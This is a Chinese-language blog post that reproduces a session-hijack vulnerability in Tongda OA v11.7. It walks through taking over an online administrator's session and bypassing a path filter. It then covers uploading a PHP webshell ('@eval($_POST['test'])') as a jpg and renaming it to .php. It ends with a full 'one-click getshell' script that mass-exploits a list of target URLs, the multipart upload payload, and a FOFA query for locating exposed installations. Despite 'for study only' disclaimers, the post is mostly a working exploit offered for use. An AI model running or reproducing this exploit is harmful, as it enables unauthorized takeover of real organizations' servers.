## 通达OA v11.7 在线用户登录漏洞复现（附带一键getshell脚本）

在文章的顶部先说明，本文章所介绍的内容以及所附带的脚本仅供学习，如果存在有牟利行为，个人负责！！！

仅用于学习娱乐，切勿用于非法用途!

请于下载后24小时内删除，使用者承担所有法律责任!

一个类似于越权的漏洞，但是利用的方式确实比较特殊

## 访问漏洞页面获取phpsession

    
    
    http://x.x.x.x/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
    

![image](https://image.3001.net/images/20210311/1615435669_60499795dd28a76ace16b.jpg!small)

可以看到我们已经获取到了phpsession，这个时候我们就可以访问他的后台页面了，但是如果页面显示RELOGIN说明存在漏洞但是管理员现在不在线，所以需要等他在线。

## 访问后台页面：

    
    
    http://x.x.x.x/general/
    

![image](https://image.3001.net/images/20210311/1615435677_6049979d69646930ab27f.jpg!small)

## 查看本地的绝对路径

![image](https://image.3001.net/images/20210311/1615435684_604997a4d312b333150e4.jpg!small)

## 新建一个附件目录

![image](https://image.3001.net/images/20210311/1615435689_604997a9db45f64c2cae6.jpg!small)

![image](https://image.3001.net/images/20210311/1615435695_604997af31fc142296b1c.jpg!small)

这里需要注意：我们要添加一个路径为系统目录后面跟上webroot，但是webroot会被过滤，但是他没有检查大小写，所以我们改为Webroot就可以轻松绕过。

## 添加图片目录

![image](https://image.3001.net/images/20210311/1615435700_604997b42745a781d1607.jpg!small)![image](https://image.3001.net/images/20210311/1615435706_604997ba4e0023cfd1951.jpg!small)

这里唯一需要注意的是我们需要将发布范围里添加一个系统管理员，这样子才可以，路径的话呢还是webroot那个路径。

## 上传木马

![image](https://image.3001.net/images/20210311/1615435712_604997c03a44afb691ec5.jpg!small)

然后我们添加一个文件，也就是我们的shell

![image](https://image.3001.net/images/20210311/1615435720_604997c85a8fafd77f3f0.jpg!small)

这里需要注意的是，我们需要将我们的木马改为jpg后缀的，要不路径无法查看。

## 查看木马路径

![image](https://image.3001.net/images/20210311/1615435724_604997cc5e93d49916e3a.jpg!small)![image](https://image.3001.net/images/20210311/1615435728_604997d0acd46f1e64e03.jpg!small)

这个时候记住这个文件名称，这个路径是固定的就是file_folder/2013下面就是我们的木马。

## 修改木马后缀

回到我们之前的上传页面，然后点击编辑。

![image](https://image.3001.net/images/20210311/1615435734_604997d6430a5ab5278a3.jpg!small)

鼠标放到我们木马上面，然后点击重命名。

我们会打开一个新的tab页面，我们使用火狐进行抓包：

先随便改个名字，点击保存，然后会拦截到一个post封包。

数据包格式大概是这个样子：

    
    
    NEW_FILE_NAME=166&CONTENT_ID=118&FILE_SORT=2&ATTACHMENT_ID=2925%402103_1578257970&ATTACHMENT_NAME_POSTFIX=jpg&ATTACHMENT_NAME=2.jpg&FIRST_ATTACHMENT_NAME=2&FILE_NAME_OLD=2.jpg
    

这个时候我们就需要修改ATTACHMENT_NAME_POSTFIX属性为php.（注意后面有个.）

然后重放这个数据包，就可以看到修改成功。

## 拼接木马路径

![image](https://image.3001.net/images/20210311/1615435738_604997da6f047aa92ee77.jpg!small)

可以看到我们修改成功。

然后找到之前的文件名，然后将我们上传的原始的文件名(2.jpg)改为(166.php)，这个是根据你上传的路径以及改的名称来定的，然后路径的话呢还是file_folder/2013，我们就可以访问到我们的马子了。

## 一键GetShell脚本

脚本代码:

    
    
    #define payload = /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
    #define yinhao = "
    #define Rootre = <td nowrap class="TableData">(.*?)</td>
    #define contentidre = "TableLine1" index="(.*?)" >
    #define attachmentidre = ATTACHMENT_ID_OLD" value="(.*?),"
    #define shellpathre = alt="(.*?)" node-image-tips
    function GetCookie(url){
    	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
    	if(StrFindStr(res[1],"PHPSESSID",0) == "-1"){
    		return "";
    	}
    	PHPSESSID = GettextMiddle(res[1],"PHPSESSID=",";");
    	return PHPSESSID;
    }
    function JudgeOK(url,Cookie){
    	res = HttpGet(url."/general/",Cookie);
    	if(StrFindStr(res[0],"/static/js/ba/agent.js",0) == "-1"){
    		return "0";
    	}else{
    		return "1";
    	}
    
    }
    function GetRoot(content){
    	list = StrRe(content,Rootre);
    	num = GetArrayNum(list);
    	num = num/2;
    	i = 0;
    	while(i<num){
    		if(StrFindStr(list[ToInt(i*2+1)],":\",0) != "-1"){
    			return list[ToInt(i*2+1)];
    		}
    		i = i+1;
    	}
    	return "";
    }
    function GetWebRoot(url,Cookie){
    	res = HttpGet(url."/general/system/reg_view/",Cookie);
    	return GetRoot(res[0]);
    }
    function AddPath(url,Root,Cookie){
    	return HttpPost(url."/general/system/attachment/position/add.php","POS_ID=166&POS_NAME=166&POS_PATH=".URLEncode(Root."\WebRoot")."&IS_ACTIVE=on",Cookie);
    }
    function AddImgPath(url,Root,Cookie){
    	return HttpPost(url."/general/system/picture/new/submit.php","TO_ID=&TO_NAME=&PRIV_ID=&PRIV_NAME=&ampCOPY_TO_ID=admin%2C&ampCOPY_TO_NAME=%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1%2C&PIC_NAME=test&PIC_PATH=".URLEncode(Root."\webRoot")."&ROW_PIC=5&ROW_PIC_NUM=7",Cookie);
    }
    function PushImg(url,Content,Cookie){
    	return HttpPost(url."/general/file_folder/new/submit.php",Content,Cookie.StrRN()."Content-Type: multipart/form-data; boundary=---------------------------33072116513621237124579432636");
    }
    function GetPICID(url,Cookie){
    	res = HttpGet(url."/general/picture/tree.php?CUR_DIR=&PIC_ID=&_=1615284234507",Cookie);
    	return GettextMiddle(res[0],"&PIC_ID=",yinhao);
    }
    function GetImg(url,Root,Cookie){
    	res = HttpGet(url."/general/picture/picture_view.php?SUB_DIR=2103&PIC_ID=".GetPICID(url,Cookie)."&CUR_DIR=".URLEncode(StrReplace(Root,"\\","/"))."%2Fwebroot%2Ffile_folder%2F2103",Cookie);
    	list = StrRe(res[0],shellpathre);
    	num = GetArrayNum(list);
    	num = num/2;
    	i = 0;
    	while(i<num){
    		if(StrFindStr(list[ToInt(i*2+1)],"1.jpg",0) != "-1"){
    			return list[ToInt(i*2+1)];
    		}
    		i = i+1;
    	}
    	return "";
    }
    function ChangeImgName(url,CONTENT,ATTACHMENT,Cookie){
    	return HttpPost(url."/general/file_folder/rename_submit.php","NEW_FILE_NAME=166&CONTENT_ID=".CONTENT."&FILE_SORT=2&ATTACHMENT_ID=".URLEncode(ATTACHMENT)."&ATTACHMENT_NAME_POSTFIX=php.&ATTACHMENT_NAME=1.jpg&FIRST_ATTACHMENT_NAME=1&FILE_NAME_OLD=1.jpg",Cookie);
    }
    function GetCONTENTID(url,Cookie){
    	res = HttpGet(url."/general/file_folder/folder.php?FILE_SORT=2&SORT_ID=0",Cookie);
    	list = StrRe(res[0],contentidre);
    	if(GetArrayNum(list) >= 2){
    		return list[1];
    	}
    	return "";
    }
    function GetATTACHMENTID(url,CONTENTID,Cookie){
    	res = HttpGet(url."/general/file_folder/edit.php?FILE_SORT=2&SORT_ID=0&CONTENT_ID=".CONTENTID."&start=0",Cookie.StrRN()."Referer: ".url."/general/file_folder/folder.php?FILE_SORT=2&SORT_ID=0");
    	list = StrRe(res[0],attachmentidre);
    	if(GetArrayNum(list) >= 2){
    		return list[1];
    	}
    	return "";
    }
    function GetShell(url){
    	PHPSESSID = GetCookie(url);
    	if(PHPSESSID == ""){
    		return "";
    	}
    	Cookie = "Cookie: PHPSESSID=".PHPSESSID.";".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0";
    	if(JudgeOK(url,Cookie)=="1"){
    		WebRoot = GetWebRoot(url,Cookie);
    		AddPath(url,WebRoot,Cookie);
    		AddImgPath(url,WebRoot,Cookie);
    		ShellPost = ReadFile("script\综合漏洞\OAShell.txt");
    		PushImg(url,ShellPost,Cookie);
    		path = GetImg(url,WebRoot,Cookie);
    		CONTENTID = GetCONTENTID(url,Cookie);
    		ATTACHMENTID=GetATTACHMENTID(url,CONTENTID,Cookie);
    		ChangeImgName(url,CONTENTID,ATTACHMENTID,Cookie);
    		realshellpath = url."/file_folder/2103/".StrReplace(path,"1.jpg","166.php");
    		print("Shell路径:",realshellpath,"密码:test");
    	}else{
    		return "";
    	}
    }
    function main(args){
    	print("请输入要要检测的列表文件:");	
    	list = StrSplit(ReadFile(input()),StrRN());
    	i = 0;
    	num = GetArrayNum(list);
    	while(i < num){
    		url=list[ToInt(i)];
    		print("当前检测的连接:".url);
    		GetShell(url);
    		i=i+1;
    	}
    	print("检测完毕");
    }
    

OAShell.txt：

    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="SUBJECT"
    
    166.jpg
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="CONTENT_NO"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="TD_HTML_EDITOR_CONTENT"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="KEYWORD"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="NEW_NAME"
    
    ÐÂ½¨ÎÄµµ
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="NEW_TYPE"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="ATTACHMENT_1"; filename=""
    Content-Type: application/octet-stream
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="ATTACH_NAME"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="ATTACH_DIR"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="DISK_ID"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="ATTACHMENT_1000"; filename=""
    Content-Type: application/octet-stream
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="ATTACHMENT_DESC"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="CONTENT_ID"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="OP"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="PD"
    
    1
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="SORT_ID"
    
    0
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="ATTACHMENT_ID_OLD"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="ATTACHMENT_NAME_OLD"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="FILE_SORT"
    
    2
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="USE_CAPACITY"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="USE_CAPACITY_SIZE"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="SHARE_USER"
    
    
    -----------------------------33072116513621237124579432636
    Content-Disposition: form-data; name="ATTACHMENT_0"; filename="1.jpg"
    Content-Type: image/jpeg
    
    <?php @eval($_POST['test']); ?>
    -----------------------------33072116513621237124579432636--    
    

放一张例子截图：

![image](https://image.3001.net/images/20210311/1615435742_604997de54b4d6e8be360.jpg!small)

附一个fofa语句：

    
    
    app="TDXK-通达OA"
    

附Cheetah脚本语言下载地址：

https://github.com/Wker666/Demo

